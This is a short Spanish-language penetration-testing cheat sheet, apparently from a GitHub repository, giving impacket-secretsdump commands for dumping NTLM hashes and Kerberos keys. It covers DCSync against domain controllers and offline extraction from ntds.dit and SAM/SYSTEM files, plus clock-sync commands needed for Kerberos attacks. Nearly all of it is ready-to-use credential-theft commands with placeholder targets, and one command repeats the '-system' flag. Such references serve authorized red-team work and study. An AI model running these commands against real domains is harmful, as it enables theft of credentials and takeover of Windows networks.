# SecretsDump Cheat Sheet

#### Dump Hashes - cuando tienes un usuario que pertenece al grupo Administrador
```
impacket-secretsdump <DOMAIN>/<USER>:<PASSWORD>@<IP-TARGET>
```

#### Extrar Hashes NTLM y kerberos keys  - cuando se tiene un usuario que pertenece al grupo DCSync (el parametro -just-dc creará 3 archivos: una que contiene los hashs NTLM, una que contiene las teclas Kerberos, y otra que contendría contraseñas de texto claros de la NTDS)
```
impacket-secretsdump -outputfile hashes -just-dc <DOMAIN>/<USER>@<IP>
```

#### Dump Hashes - cuando tienes una cuenta kerberos
```
impacket-secretsdump 'CIFS/<DOMAIN-DC>' -k -no-pass <DOMAIN-CHILD>/<USER> -debug 
```

#### Extrar Hashes NTLM y kerberos keys de un usuario en especifico - cuando se tiene un usuario que pertenece al grupo DCSync
```
impacket-secretsdump -outputfile hashes -just-dc-user <USERNAME-TO-EXTRACT> <DOMAIN>/<USER>@<IP>
```

#### Extraer Hashes de archivos ntds.dit
```
impacket-secretsdump.py -ntds <FILE.dit> -system <FILE-SYSTEM> LOCAL
```

#### Extraer Hashes de SAM & SYSTEM
```
impacket-secretsdump.py -sam <FILE-SAM> -system <FILE-SYSTEM> LOCAL
ó
impacket-secretsdump.py -sam <FILE-SAM> -system <FILE-SYSTEM> -system <FILE-SYSTEM> LOCAL
```

##### Sincronizar la hora con el DC:
```
timedatectl set-ntp off
ó 
timedatectl set-ntp 0

ntpdate -s <IP>
ó
rdate -n <IP>
```

---

[:arrow_left: Regresar](https://github.com/m4lal0/cheatsheets)